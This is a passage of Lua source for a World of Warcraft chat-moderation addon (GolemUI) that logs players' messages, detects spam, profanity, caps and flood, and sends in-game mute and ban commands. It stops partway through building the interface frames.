----------------------------------------------------------------------------------------------
-- Описание всех глобальных переменных
-- Таблица фремов хранящих логи пользователей
local users = {};
-- Идентификатор пользователя
local userID = 0;
-- Глобальное максимальное число сообщений ( максимальное число фремов для отображения сообщений )
local maxMessages = 0;
-- Фреймы сообщений ( лог на каждого пользователя в виде списка сообщений )
local messageFrames = {};
local maxSavedVariables = 0;
local filtersBtnFrames = {};
local savedVariablesFrames = {};
-- Таблица сообытий ( Подписываемся на определенные события вроде CHAT_MSG_CHANNEL для сканирования чата )
local eventHandlers = {};

Core = {};
Utils = {};
Antispam = {};
Filters = {};
Settings = {};
----------------------------------------------------------------------------------------------
print("|c0000ff00 ======== Hello " .. UnitName("player") .. " ========|r");
Core.MainFrame = CreateFrame("Frame", "MainFrame", Core.MainFrame, "GolemUI_Main_Frame");
Core.MainFrame:SetFrameStrata("DIALOG");
Core.MainFrame:SetParent("UIParent");
----------------------------------------------------------------------------------------------
Core.Sound = {
	-- "Сгииинь, в вечных муках"\n"
	"Sound\\Creature\\LordMarrowgar\\IC_Marrowgar_Slay02.wav",
	-- "Кости, для жертвоприношений"
	"Sound\\Creature\\LordMarrowgar\\IC_Marrowgar_Slay01.wav",
	
	"Sound\\creature\\CardinalDeathwhisper\\IC_Deathwhisper_Slay01.wav",
	"Sound\\creature\\CardinalDeathwhisper\\IC_Deathwhisper_Slay02.wav",
	
	"Sound\\Creature\\LichKing\\IC_Lich King_Slay01.wav",
	"Sound\\Creature\\LichKing\\IC_Lich King_Slay02.wav",
	-- "Ничтожество"
	"Sound/Creature/Illidan/BLACK_Illidan_09.wav",
	-- "Ненависть десяти тысяч лет"
	"Sound/Creature/Illidan/BLACK_Illidan_08.wav",
	-- "Сила истинного демона"
	"Sound/Creature/Illidan/BLACK_Illidan_13.wav",
	-- "Вы не готовы"
	"Sound/Creature/Illidan/BLACK_Illidan_04.wav",
};

 function Utils.chsize(char)
    if not char then
        return 0;
    elseif char > 240 then
        return 4;
    elseif char > 225 then
        return 3;
    elseif char > 192 then
        return 2;
    else
        return 1;
    end;
end;

function Utils.utf8sub(str, startChar, numChars)
  local startIndex = 1;
  while startChar > 1 do
      local char = string.byte(str, startIndex);
      startIndex = startIndex + Utils.chsize(char);
      startChar = startChar - 1;
  end;
  local currentIndex = startIndex; 
  while numChars > 0 and currentIndex <= #str do
    local char = string.byte(str, currentIndex);
    currentIndex = currentIndex + Utils.chsize(char);
    numChars = numChars -1;
  end;
  return str:sub(startIndex, currentIndex - 1);
end;

function Utils.utf8split(str)
 local utf8table = {};
 str:gsub("([^\128-\191][\128-\191]*)",function(char)
 local leadbyte = strbyte(char, 1);
 local length = -1;
 if leadbyte < 248 then
 if leadbyte >= 240 then length = 4;
 elseif leadbyte >= 224 then length = 3;
 elseif leadbyte >= 192 then length = 2;
 elseif leadbyte < 128 then length = 1;
 end;
 end;

 tinsert(utf8table, (length == #char) and char)
 end)
 return utf8table;
end;

function Utils.inTable(t, s)
	for k, v in pairs(t) do
		if v == s then return true end;
	end;
	return false;
end;

function Utils.utf8find(str, ch, k)
	k = k or 1;
	for i = k, strlenutf8(str) do
		local si = utf8sub(str, i, 1);
		if strbyte(si) == strbyte(ch) then return i end;
	end;
	return nil;
end;

function Utils.mysplit(inputstr, sep)
	if sep == nil then
		sep = "%s";
	end;
	local t={} ; i=1;
	for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
		t[i] = str;
		i = i + 1;
	end;
	return t;
end;

Core.mask = Utils.utf8split("abcdefghijklmnopqrstuvwxyzrабвгдеёжзийклмнопрстуфхцчшщъьыэюяABCDEFGHIJKLMNOPQRSTUVWXYZRАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЬЫЭЮЯ");

function Antispam.IsCaps(str)
	local sz = strlenutf8(str);
	if sz < CAPS_MIN_MSG_LEN then return false end;
	local c = 0;
	local n = 0;
	for i = 1, sz do
		s = Utils.utf8sub(str, i, 1 );
		u = string.upper(s);
		if Utils.inTable(Core.mask, s) then
			n = n + 1;
			if s == u then c = c + 1 end;
		end;
	end;
	return (c / n * 100) >= CAPS_PERCENT, c, n;
end;

function Antispam.ContainBadWords(message)
	for word in string.gmatch(message, "[1234567890abcdefghijklmnopqrstuvwxyzrабвгдеёжзийклмнопрстуфхцчшщъьыэюяABCDEFGHIJKLMNOPQRSTUVWXYZRАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЬЫЭЮЯ]+") do
		if Utils.inTable(Filters.BadWords, string.lower(word)) then return true, word end;
	end;
	return false, nil;
end;

function Antispam.MessageCheck(usr)
	text = usr.messages[usr.msg_count].msg;
	for i = 1, #Filters.replaceTable do
		text = string.gsub(text, Filters.replaceTable[i], "");
	end;
	--Jump();
	--SendChatMessage("/afk hello", "SAY", nil, nil);		
	--print(text)
	-- Prodavci
	for i, seller in pairs(Filters.Sellers) do
		--if CanConstruct(msg, v) then
		if string.find(text, seller) ~= nil then
			Screenshot();
			PlaySoundFile(Core.Sound[math.random(1, #Core.Sound)]);
			print("|c00ff0000 [Seller detected] |r");
			print(string.format("|c0000ff00 %-22s:|r|c000000ff %-32s|r", "Игрок", usr.frame.username));
			SendChatMessage(string.format(Filters.PunishOptions["prod.gold"], usr.frame.username), "SAY", nil, nil);
			return;
		end;
	end;
	-- Reklama
	for i, advertiser in pairs(Filters.Advertisers) do
		--if CanConstruct(msg, v) then
		if string.find(text, advertiser) ~= nil then
			Screenshot();
			PlaySoundFile(Core.Sound[math.random(1, #Core.Sound)]);
			print("|c00ff0000 [Advertiser detected] |r");
			print(string.format("|c0000ff00 %-22s:|r|c000000ff %-32s|r", "Игрок", usr.frame.username));
			SendChatMessage(string.format(Filters.PunishOptions["reklama"], usr.frame.username), "SAY", nil, nil);				
			return;
		end;
	end;
	-- Polnoe predlojenie
	for i, j in pairs(Filters.AbuseText) do
		if usr.messages[usr.msg_count].msg == j then
			Screenshot();
			PlaySoundFile(Core.Sound[math.random(1, #Core.Sound)]);
			print("|c00ff0000 [AbuseText detected] |r");
			print(string.format("|c0000ff00 %-22s:|r|c000000ff %-32s|r", "Игрок", usr.frame.username));
			---------------------------------------------------------------------------------------------
			---------------------------------------------------------------------------------------------
			---------------------------------------------------------------------------------------------
			---------------------------------------------------------------------------------------------
			SendChatMessage(".ban pla "..usr.frame.username.." 30d komm.d", "SAY", nil, nil);		
			---------------------------------------------------------------------------------------------
			---------------------------------------------------------------------------------------------
			---------------------------------------------------------------------------------------------
			---------------------------------------------------------------------------------------------			
			--SendChatMessage(string.format(Antispam.PunishOptions["reklama"], usr.frame.username), "SAY", nil, nil);				
			return;
		end;
	end;
	-- Проверяем на капс
	caps, c, n = Antispam.IsCaps(usr.messages[usr.msg_count].msg);
	-- Проверяем на содержание запрещенных слов
	mat, w = Antispam.ContainBadWords(usr.messages[usr.msg_count].msg);
	
	if caps and mat then
		Screenshot();
		PlaySoundFile(Core.Sound[math.random(1, #Core.Sound)]);
		print("|c00ff0000 [CAPS + MAT] detected |r");
		print(string.format("|c0000ff00 %-22s:|r|c000000ff %-32s|r", "Игрок", usr.frame.username));
		print(string.format("|c0000ff00 %-17s:|r|c000000ff %-32s|r", "Total len", n));
		print(string.format("|c0000ff00 %-16s:|r|c000000ff %-32s|r", "Capitalized", c));
		print(string.format("|c0000ff00 %-13s:|r|c000000ff %-32s|r", "CAPS percent", (c / n * 100)));
		print(string.format("|c0000ff00 %-18s:|r|c00ff0000 %-32s|r", "MAT", w));
		SendChatMessage(string.format(Filters.PunishOptions["caps+mat"], usr.frame.username), "SAY", nil, nil);						
		--SendChatMessage(string.format(Antispam.PunishOptions["caps+mat"], usr.frame.username), "CHANNEL", nil, GetChannelName("all"));
		return;
	end;
	if caps then
		Screenshot();
		PlaySoundFile(Core.Sound[math.random(1, #Core.Sound)]);
		print("|c00ff0000 [CAPS] detected |r");
		print(string.format("|c0000ff00 %-22s:|r|c000000ff %-32s|r", "Игрок", usr.frame.username));
		print(string.format("|c0000ff00 %-17s:|r|c000000ff %-32s|r", "Total len", n));
		print(string.format("|c0000ff00 %-16s:|r|c000000ff %-32s|r", "Capitalized", c));
		print(string.format("|c0000ff00 %-13s:|r|c000000ff %-32s|r", "CAPS percent", (c / n * 100)));
		SendChatMessage(string.format(Filters.PunishOptions["caps"], usr.frame.username), "SAY", nil, nil);		
		--SendChatMessage(string.format(Antispam.PunishOptions["caps"], usr.frame.username), "CHANNEL", nil, GetChannelName("all"));
		return;
	end;
	if mat then
		Screenshot();
		PlaySoundFile(Core.Sound[math.random(1, #Core.Sound)]);
		print("|c00ff0000 [MAT] detected |r");
		print(string.format("|c0000ff00 %-22s:|r|c000000ff %-32s|r", "Игрок", usr.frame.username));
		print(string.format("|c0000ff00 %-17s:|r|c00ff0000 %-32s|r", "MAT", w));
		SendChatMessage(string.format(Filters.PunishOptions["mat"], usr.frame.username), "SAY", nil, nil);
		--SendChatMessage(string.format(Antispam.PunishOptions["mat"], usr.frame.username), "CHANNEL", nil, GetChannelName("all"));
		return;
	end;
	-- Секция проверки флуда
	if usr.msg_count < 3 then return end;
	
	if (usr.messages[usr.msg_count].sec - usr.messages[usr.msg_count - 2].sec ) < MAX_MSG_TIME and
		usr.messages[usr.msg_count].msg == usr.messages[usr.msg_count - 1].msg and
		usr.messages[usr.msg_count].msg == usr.messages[usr.msg_count - 2].msg then
		
		Screenshot();
		PlaySoundFile(Core.Sound[math.random(1, #Core.Sound)]);
		--TakeScreenshot();
		--isConnected = UnitIsConnected("unit")		
		local sz = usr.msg_count;
		local m = usr.messages;
		
		print("|c00ff0000 [flood detected] |r");
		print("|c0000ff00 Игрок: |r|c000000ff"..usr.frame.username.."|r");
		print("|c0000ff00 Время между сообщениями: "..(usr.messages[usr.msg_count].sec - usr.messages[usr.msg_count - 2].sec).."|r" );
		print("|c00ff0000 Лог сообщений: |r");
		print("|c00ff0000 ["..m[sz - 2].sec.."]["..m[sz - 2].timestamp.."]"..m[sz - 2].msg.."|r");
		print("|c00ff0000 ["..m[sz - 1].sec.."]["..m[sz - 1].timestamp.."]"..m[sz - 1].msg.."|r");
		print("|c00ff0000 ["..m[sz].sec.."]["..m[sz].timestamp.."]"..m[sz].msg.."|r");
		
		SendChatMessage(string.format(Filters.PunishOptions["flood"], usr.frame.username), "SAY", nil, nil);		
		--SendChatMessage(string.format(Antispam.PunishOptions["flood"], usr.frame.username), "CHANNEL", nil, GetChannelName("all"));
	end;
end;

function OnShowFrame(self)
	print("OnShowFrame");
	if self.filter == true then
		print("THIS IS SPARTA");
	else
		return;
	end;

	local user_entry = nil;
	for k, v in pairs(users) do	
		if v.frame.selected then
			user_entry = v;
		end;
	end;
	
	if user_entry == nil then return end;
	
	if Settings.debug_mode == true then
		print("USER: "..user_entry.frame.username..", MSG_COUNT: "..user_entry.msg_count);
		for k, v in pairs(user_entry.messages) do
			print (k, v.msg, v.sec);
		end;
	end;
end;

function SelectButton(self, ...)
	if Settings.debug_mode then
		print("SelectButton");
		print("removeID=");
		print(self.removeID);
	end;
	
	if self.removeID ~= nil then
		if Settings.debug_mode then
			print(#filtersBtnFrames);
		end;
		local selectedFilter = nil;
		for k, v in pairs(filtersBtnFrames) do	
			if v.selected then
				selectedFilter = v;
				break;
			end;
		end;
		if selectedFilter == nil then return end;
		if Settings.debug_mode then
			print("Item for remove:");
		end;
		--print(Filters[selectedFilter.filter_name][self.removeID + 1])
		table.remove(Filters[selectedFilter.filter_name], self.removeID + 1);
		Core.RefreshSavedVariablesFrame(selectedFilter);
		--print(selectedFilter.filter_name)
		return;
	end;
	
	if self.filter then
		if Settings.debug_mode then
			print("THIS IS FILTER !!!");
		end;
		if self.selected == true then
			if Settings.debug_mode == true then
				print("DESELECT");
			end;
			self:UnlockHighlight();
			self.selected = false;
			Core.SavedVariablesFrame:Hide();
		else
			--print(getglobal(self:GetName()))
			print(#Filters[self.filter_name]);
			--print(#getglobal("Filters"..self.filter_name))
			print(self.filter_name);
		
			if #Filters[self.filter_name] > 6 then
				Core.SavedVariablesScrollBar:SetMinMaxValues(0, #Filters[self.filter_name] * MESSAGE_BTN_SIZE - 240);
			else
				Core.SavedVariablesScrollBar:SetMinMaxValues(0, 0);
			end;
			
			for i = 1, #savedVariablesFrames do
				savedVariablesFrames[i].frame:Hide();
				savedVariablesFrames[i].btn:Hide();
			end;
			
			for k,v in pairs(Filters[self.filter_name]) do
				local s = Filters[self.filter_name][k];
				getglobal(savedVariablesFrames[k].frame:GetName().."Text"):SetText(s);
				savedVariablesFrames[k].frame:Show();
				savedVariablesFrames[k].btn:Show();
			end;
			
			for k, v in pairs(filtersBtnFrames) do	
				v:UnlockHighlight();
				v.selected = false;
			end;
			
			self:LockHighlight();
			self.selected = true;
			
			getglobal(SavedVariablesFrame:GetName().."Text"):SetText(self.filter_name);
			Core.SavedVariablesFrame:Show();
		end;
	else
		if self.selected == true then
			if Settings.debug_mode == true then
				print("DESELECT");
			end;
			self:UnlockHighlight();
			self.selected = false;
			Core.LogsStatusFrame:Hide();
		else
			if self.username == nil then return end;
			if Settings.debug_mode == true then
				print("NAME:"..self.username);
				print("SELECT");
				print("FRAME COUNT: "..#messageFrames);
				print("SELECTED USER: "..self.username..", MSG_COUNT: "..users[self.username].msg_count);
			end;
			
			if users[self.username].msg_count > 6 then
				Core.LogsStatusScrollBar:SetMinMaxValues(0, users[self.username].msg_count * MESSAGE_BTN_SIZE - 287);
			else
				Core.LogsStatusScrollBar:SetMinMaxValues(0, 0);
			end;
			
			for i = 1, #messageFrames do
				messageFrames[i]:Hide();
			end;
			
			for k,v in pairs(users[self.username].messages) do
				--print (k, v.msg, v.time)
				-- Split messsage into words
				--local words = Utils.mysplit(v.msg)
				local s = "["..v.sec.."]|c00ff0000[" .. v.timestamp .. "]|r "..v.msg;
				getglobal(messageFrames[k]:GetName().."Text"):SetText(s);
				messageFrames[k]:Show();
				--getglobal(GolemUI_Message_List_Message_..i):Hide()
			end;
			
			for k, v in pairs(users) do	
				v.frame:UnlockHighlight();
				v.frame.selected = false;
			end;
			self:LockHighlight();
			self.selected = true;
			
			getglobal(Entry_Status:GetName().."Text"):SetText(self.username);
			Core.LogsStatusFrame:Show();
		end;
	end;
end;

function Core.RefreshStatusFrame(sender)
	if users[sender].msg_count > 6 then
		Core.LogsStatusScrollBar:SetMinMaxValues(0, (users[sender].msg_count - 1) * MESSAGE_BTN_SIZE - 287);
	else
		Core.LogsStatusScrollBar:SetMinMaxValues(0, 0);
	end;
	local u = users[sender];
	local s = "["..u.messages[u.msg_count].sec.."]|c00ff0000[" .. u.messages[u.msg_count].timestamp .. "]|r "..u.messages[u.msg_count].msg;
	getglobal(messageFrames[u.msg_count]:GetName().."Text"):SetText(s);
	messageFrames[u.msg_count]:Show();
end;

function Core.RefreshSavedVariablesFrame(self, ...)
	if #Filters[self.filter_name] > 6 then
		Core.SavedVariablesScrollBar:SetMinMaxValues(0, #Filters[self.filter_name] * MESSAGE_BTN_SIZE - 240);
	else
		Core.SavedVariablesScrollBar:SetMinMaxValues(0, 0);
	end;
	
	for i = 1, #savedVariablesFrames do
		savedVariablesFrames[i].frame:Hide();
		savedVariablesFrames[i].btn:Hide();
	end;
	
	if Settings.debug_mode then
		print ("OnREFRESH:"..self.filter_name);
	end;
	for k,v in pairs(Filters[self.filter_name]) do
		local s = Filters[self.filter_name][k];
		--print(k.." "..v)
		getglobal(savedVariablesFrames[k].frame:GetName().."Text"):SetText(s);
		savedVariablesFrames[k].frame:Show();
		savedVariablesFrames[k].btn:Show();
		--getglobal(GolemUI_Message_List_Message_..i):Hide()
	end;
end;

function Core.Logs(msg, sender, ...)
	-- Не будем вести логов на самого себя если не включен режим отладки
	if sender == UnitName("player") and Settings.debug_mode == false then
		return;
	end;
	-- Если юзер еще не добавлен в таблицу наблюдений
	if users[sender] == nil then
		-- Создаем таблицу - упаковку для данных пользователя
		local u = {...};
		-- Запишем индекс пользователя
		u.ID = userID;
		-- Таблица сообщений текущего пользователя
		u.messages = {};
		-- Т.к. запись только создается - сообщение для записи единственное
		u.msg_count = 1;
		-- Создаем таблицу - упаковку для сообщений
		local m = {...};
		-- Сохраняем сообщение
		m.msg = msg;
		-- Запишем время возникновения сообщения
		m.timestamp = date("%d.%m.%y %H:%M:%S");
		-- Запишем "Точное" время сообщения
		m.sec = GetTime();
		-- Создаем фреймы для отображения сообщений
		if maxMessages == 0 then
			msgFrame = CreateFrame("Button", "$parent_Message_"..maxMessages, GolemUI_Message_List, "GolemUI_Message_List_Template");
			msgFrame:SetPoint("TOPLEFT", 0, 0);
			maxMessages = 1;
			table.insert(messageFrames, msgFrame);
		end;
		-- Добавляем сообщение в таблицу сообщений текущего пользователя
		table.insert(u.messages, m);
		-- Создаем фрейм - кнопку пользователя
		u.frame = CreateFrame("Button", "$parent_Entry_"..userID, GolemUI_Entry_List, "GolemUI_Entry_List_Template");
		-- Задаем ID фрейма
		u.frame:SetID(userID);
		-- Запоминаем ник
		u.frame.username = sender;
		-- Если пользователь первый в списке
		if userID == 0 then
			-- Присоединяем фрейм к родительскому
			u.frame:SetPoint("TOPLEFT", GolemUI_Entry_List, "TOPLEFT", 0, 0);
		else
			-- Иначе присоединяем к предыдущему фрейму (вниз)
			u.frame:SetPoint("TOPLEFT", "$parent_Entry_"..(userID - 1), "BOTTOMLEFT", 0, 0);
		end;
		-- Задаем текст кнопки
		--getglobal(u.frame:GetName().."Text"):SetText(userID.. ". "..sender)		
		getglobal(u.frame:GetName().."Text"):SetText(sender);
		-- Реализуем появление фрейма
		UIFrameFadeIn(u.frame, 1.34);
		-- Сохраняем пользователя в таблице пользователей
		users[sender] = u;
		-- Переходим к след. идентификатору
		userID = userID + 1;
		-- Если открыто окно статистики сообщений
		if u.frame.selected then
			-- Обновляем инфу фрейма статистики
			Core.RefreshStatusFrame(sender);
		end;
	-- Если пользователь уже есть в таблице - добавляем сообщение к его списку сообщений
	else
		-- Увеличиваем количество сообщений
		users[sender].msg_count = users[sender].msg_count + 1;
		-- Создаем упаковку для сообщения
		local m = {...};
		-- Собираем инфу
		m.msg = msg;
		m.timestamp = date("%d.%m.%y %H:%M:%S");
		m.sec = GetTime();
		-- Создаем дополнительный фрейм в окне статистики собщений, если уже созданных не достаточно
		if users[sender].msg_count > maxMessages then			
			msgFrame = CreateFrame("Button", "$parent_Message_"..maxMessages, Core.LogsStatusContentFrame, "GolemUI_Message_List_Template");
			msgFrame:SetPoint("TOPLEFT", "$parent_Message_"..(maxMessages - 1), "BOTTOMLEFT", 0, 0);
			table.insert(messageFrames, msgFrame);
			-- Расширяем фрейм родитель
			if MESSAGE_BTN_SIZE * (Core.LogsStatusContentFrame:GetNumChildren() + 1) > Core.LogsStatusContentFrame:GetHeight() then
				Core.LogsStatusContentFrame:SetHeight(MESSAGE_BTN_SIZE * Core.LogsStatusContentFrame:GetNumChildren());
			end
			-- Максимальное количество фреймов теперь равно максимальному количеству сообщений из всех пользователей
			maxMessages = users[sender].msg_count;
		end
		-- Добавляем упакованное сообщение в таблицу сообщений пользователя
		table.insert(users[sender].messages, m);
		-- Если открыто окно статистики сообщений
		if users[sender].frame.selected then
			-- Обновляем инфу фрейма статистики
			Core.RefreshStatusFrame(sender);
		end;
	end;
	-- Проверяем и если необходимо - расширяем фрейм отображения кнопок всех пользователей
	if USER_BTN_SIZE * (Core.LogsContent:GetNumChildren() + 1) > Core.LogsContent:GetHeight() then
		Core.LogsContent:SetHeight(USER_BTN_SIZE * (Core.LogsContent:GetNumChildren() + 1));
		if Core.LogsContent:GetNumChildren() > 11 then
			local n = Core.LogsFrame:GetHeight() % USER_BTN_SIZE;
			Core.LogsScrollBar:SetMinMaxValues(0, (Core.LogsContent:GetNumChildren() - n) * USER_BTN_SIZE);
		end;
	end;
	-- Проверяем сообщение пользователя
	Antispam.MessageCheck(users[sender]);
end;

function eventHandlers.CHAT_MSG_SAY(msg, sender, ...)
	Core.Logs(msg, sender, ...);
end;

function eventHandlers.CHAT_MSG_WHISPER(msg, sender, ...)
	Core.Logs(msg, sender, ...);
end;

function eventHandlers.CHAT_MSG_PARTY(msg, sender, ...)
	Core.Logs(msg, sender, ...);
end;

function eventHandlers.CHAT_MSG_RAID(msg, sender, ...)
	Core.Logs(msg, sender, ...);
end;

function eventHandlers.CHAT_MSG_GUILD(msg, sender, ...)
	Core.Logs(msg, sender, ...);
end;

function eventHandlers.CHAT_MSG_CHANNEL(msg, sender, ...)
	Core.Logs(msg, sender, ...);
end;

--timeToPause должно быть примерно равно по времени со звуком , звук играет 5 сек , значит и timeToPause должно быть 5 сек или около того , иначе звук будет накладываться сам на себя.
local timeToPause = 7; -- Величина в секундах, интервал между повторениями звука. Ивентов я так понял херячит много за 1 секунду, если воспроизводить таким образом получишь калаш :D

local EnableAlarm = true; -- флажок , можно или нельзя сигналить!!!это не конфиг для включения и отключения сигнала!!!;
local time = 0; -- Это так же не конфиг !!!
local function OnUpdate(self, elapsed) -- обработчик для таймера;
	time = time + elapsed;
	if time > timeToPause then
		EnableAlarm = true;
		time = 0;
		self:SetScript("OnUpdate", nil)
	end
end
local alarm = CreateFrame"frame";
alarm:SetScript("OnEvent", function(self, event) -- обработчик событий
	if arg1:find("[ANTICHEAT]") and EnableAlarm then
		PlaySoundFile("Interface\\AddOns\\GolemUI\\sound.mp3", "Master")
		self:SetScript("OnUpdate", OnUpdate)
		EnableAlarm = false;
	end
end)
alarm:RegisterEvent("UI_ERROR_MESSAGE");

-- Задаем обработчики событий
function ScanChatEventHandler(self, event, ...)
	return eventHandlers[event](...);
end;

-- Добавляем слеш команду 
SLASH_GOLEM_STATUS1 = "/golem";
SlashCmdList["GOLEM_STATUS"] = function(msg)
	-- Если уже запущен - останавливаем
	--Settings.running = not Settings.running
	
	if Settings.running then
		Core.AddonDisable()
	else
		Core.AddonEnable()
	end
end
----------------------------------------------------------------------------------------------
Core.MainFrame:RegisterEvent("ADDON_LOADED")
Core.MainFrame:SetScript("OnEvent", ScanChatEventHandler);
function eventHandlers.ADDON_LOADED(...)
	Core.MainFrame:UnregisterEvent("ADDON_LOADED")
	if Settings.debug_mode == true then
		print("Loaded Event")
	end	
	-- Получаем данные таблиц из SavedVariables или создаем пустые таблицы с заведомо заданными именами и некоторыми данными
	if GolemUI_antiSpamDB == nil then
		GolemUI_antiSpamDB = {
			["AbuseText"] = {},
			["Advertisers"] = {},
			["BadWords"] = {},
			["Sellers"] = {},
			["replaceTable"] = {
				"{звезда}", -- [1]
				"{круг}", -- [2]
				"{ромб}", -- [3]
				"{треугольник}", -- [4]
				"{полумесяц}", -- [5]
				"{квадрат}", -- [6]
				"{крест}", -- [7]
				"{череп}", -- [8]
			},
			["PunishOptions"] = {
				["raspr.bagov"] = "ban pla %s 30d raspr.bagov",
				["polit.propaganda"] = ".mute %s 400 polit.propaganda",
				["caps+flood+mat"] = ".mute %s 460 caps+flood+mat",
				["Obmen/prodaja2.3"] = "ban pla %s 14d Obmen/prodaja2.3",
				["caps"] = ".mute %s 60 caps",
				["flood+mat"] = ".mute %s 400 flood+mat",
				["Ock po nacpriznaky"] = "ban pla %s 30d Ock po nacpriznaky",
				["komm.d"] = "ban pla %s 30d komm.d",
				["moshennik"] = "ban pla %s -1d moshennik",
				["flood"] = ".mute %s 200 flood",
				["Ockadm/servera"] = "ban pla %s 30d Ockadm/servera",
				["prod.gold"] = ".ban pla %s -1d prod.gold",
				["caps+flood"] = ".mute %s 260 caps+flood",
				["OckIgr"] = ".mute %s 400 OckIgr",
				["zav.mat"] = ".mute %s 60 zav.mat",
				["caps+mat"] = ".mute %s 260 caps+mat",
				["mat"] = ".mute %s 200 mat",
				["OckPod"] = "ban pla %s 30d OckPod",
				["peklama"] = ".ban pla %s -1d peklama",
			},			
			["Settings"] = {
				["running"] = false,
				["debug_mode"] = false,
				["anticheat"] = true,
				["scanWHISPER"] = true,
				["scanRAID"] = true,
				["scanCHANNEL"] = true,
				["scanGUILD"] = true,
				["scanPARTY"] = true,
				["scanSAY"] = true,
			},
		}
	end
	Filters = GolemUI_antiSpamDB
	-- Получаем сохраненные параметры настроек
	Settings = GolemUI_antiSpamDB["Settings"]
	----------------------------------------------------------------------------------------------	
	-- Создание элементов управления
	-------------------------------------------------------------
	-- Кнопка Включить
	-------------------------------------------------------------
	Core.btnOn = CreateFrame("Button", "btnOn", Core.MainFrame, "GolemUI_Entry_List_Template");
	Core.btnOn:SetPoint("TOP", -35, -30)
	Core.btnOn:SetText("On")
	Core.btnOn:SetWidth(60)
	Core.btnOn:SetHeight(27)	
	-------------------------------------------------------------
	-- Кнопка выключить
	-------------------------------------------------------------
	Core.btnOff = CreateFrame("Button", "btnOff", Core.MainFrame, "GolemUI_Entry_List_Template");
	Core.btnOff:SetPoint("TOP", 35, -30)
	Core.btnOff:SetText("Off")
	Core.btnOff:SetWidth(60)
	Core.btnOff:SetHeight(27)
	-------------------------------------------------------------
	-- Кнопка логов
	-------------------------------------------------------------
	Core.btnLogs = CreateFrame("Button", "btnLogs", Core.MainFrame, "GolemUI_Entry_List_Template");
	Core.btnLogs:SetPoint("TOP", 0, -60)
	Core.btnLogs:SetText("Logs")
	Core.btnLogs:SetWidth(130)
	Core.btnLogs:SetHeight(27)
	-------------------------------------------------------------
	-- Кнопка настроек
	-------------------------------------------------------------
	Core.btnSettings = CreateFrame("Button", "btnSettings", Core.MainFrame, "GolemUI_Entry_List_Template");
	Core.btnSettings:SetPoint("TOP", 0, -90)
	Core.btnSettings:SetText("Settings")
	Core.btnSettings:SetWidth(130)
	Core.btnSettings:SetHeight(27)
	-------------------------------------------------------------
	-- Создаем и настраиваем фрейм логов	
	-------------------------------------------------------------
	Core.LogsFrame = CreateFrame("Frame", "LogsFrame", Core.MainFrame, "GolemUI_Main_Frame")
	Core.LogsFrame:SetWidth(220)
	Core.LogsFrame:SetHeight(310)
	getglobal(Core.LogsFrame:GetName().."Texture"):SetWidth(300)
	getglobal(Core.LogsFrame:GetName().."Title"):SetText("Logs")	
	Core.LogsFrame:SetFrameStrata("DIALOG")	
	Core.LogsFrame:Hide()
	--scrollframe
	Core.LogsScrollFrame = CreateFrame("ScrollFrame", nil, Core.LogsFrame)
	Core.LogsScrollFrame:SetPoint("TOPLEFT", 10, -25)
	Core.LogsScrollFrame:SetPoint("BOTTOMRIGHT", -10, 10)
	Core.LogsScrollFrame:SetSize(200, 200)
	Core.LogsFrame.scrollframe = Core.LogsScrollFrame
	--scrollbar
	Core.LogsScrollBar = CreateFrame("Slider", "GolemUI_Entry_List_ScrollBar", Core.LogsScrollFrame, "UIPanelScrollBarTemplate")
	Core.LogsScrollBar:SetPoint("TOPLEFT", Core.LogsFrame, "TOPRIGHT", 4, -16)
	Core.LogsScrollBar:SetPoint("BOTTOMLEFT", Core.LogsFrame, "BOTTOMRIGHT", 4, 16)
	Core.LogsScrollBar:SetMinMaxValues(1, 1)
	Core.LogsScrollBar:SetValueStep(1)
	Core.LogsScrollBar.scrollStep = 1
	Core.LogsScrollBar:SetValue(0)
	Core.LogsScrollBar:SetWidth(16)
	Core.LogsScrollBar:SetScript("OnValueChanged",
	function (self, value)
		local n = value % 25;
		self:GetParent():SetVerticalScroll(value)--n * 25)
	end)
	-- texture
	local scrollbg = Core.LogsScrollBar:CreateTexture(nil, "BACKGROUND")
	scrollbg:SetAllPoints(Core.LogsScrollBar)
	scrollbg:SetTexture(0, 0, 0, 0.4)
	Core.LogsFrame.scrollbar = Core.LogsScrollBar
	-- content frame
	Core.LogsContent = CreateFrame("Frame", "GolemUI_Entry_List", Core.LogsScrollFrame)
	Core.LogsContent:SetSize(200, 50)
	Core.LogsContent:SetAllPoints()
	Core.LogsScrollFrame.content = Core.LogsContent
	Core.LogsScrollFrame:SetScrollChild(Core.LogsContent)
	-- К фрейму логов добавляем фрейм содержащий список сообщений
	Core.LogsStatusFrame = CreateFrame("Frame", "Entry_Status", Core.LogsFrame, "TitleTemplate")
	Core.LogsStatusFrame:SetPoint("TOPLEFT", Core.LogsFrame, "TOPRIGHT", -640, 0)
	Core.LogsStatusFrame:SetPoint("BOTTOMLEFT", Core.LogsFrame, "BOTTOMRIGHT", -400, 0)
	Core.LogsStatusFrame:SetWidth(400)
	Core.LogsStatusFrame:Hide()
	--scrollframe
	Core.LogsStatusScrollFrame = CreateFrame("ScrollFrame", nil, Core.LogsStatusFrame)
	Core.LogsStatusScrollFrame:SetPoint("TOPLEFT", Core.LogsStatusFrame, "TOPLEFT", 12, -12)
	--Core.LogsStatusScrollFrame:SetPoint("BOTTOMRIGHT", Core.LogsStatusFrame, "BOTTOMRIGHT", 0, 1)
	Core.LogsStatusScrollFrame:SetWidth(376)
	Core.LogsStatusScrollFrame:SetHeight(287)
	--local texture = Core.LogsStatusScrollFrame:CreateTexture()
	--texture:SetAllPoints()
	--texture:SetTexture(.5,.5,.5,1)
	--Core.LogsStatusScrollFrame.texture = texture
	--Core.LogsStatusScrollFrame:SetBackdrop(backdrop)
	Core.LogsStatusFrame.scrollframe = Core.LogsStatusScrollFrame
	--scrollbar
	Core.LogsStatusScrollBar = CreateFrame("Slider", "GolemUI_Message_List_ScrollBar", Core.LogsStatusScrollFrame, "UIPanelScrollBarTemplate")
	Core.LogsStatusScrollBar:SetPoint("TOPLEFT", Core.LogsStatusFrame, "TOPRIGHT", 4, -16)
	Core.LogsStatusScrollBar:SetPoint("BOTTOMLEFT", Core.LogsStatusFrame, "BOTTOMRIGHT", 4, 16)
	Core.LogsStatusScrollBar:SetMinMaxValues(1, 1)
	Core.LogsStatusScrollBar:SetValueStep(1)
	Core.LogsStatusScrollBar.scrollStep = 1
	Core.LogsStatusScrollBar:SetValue(0)
	Core.LogsStatusScrollBar:SetWidth(16)
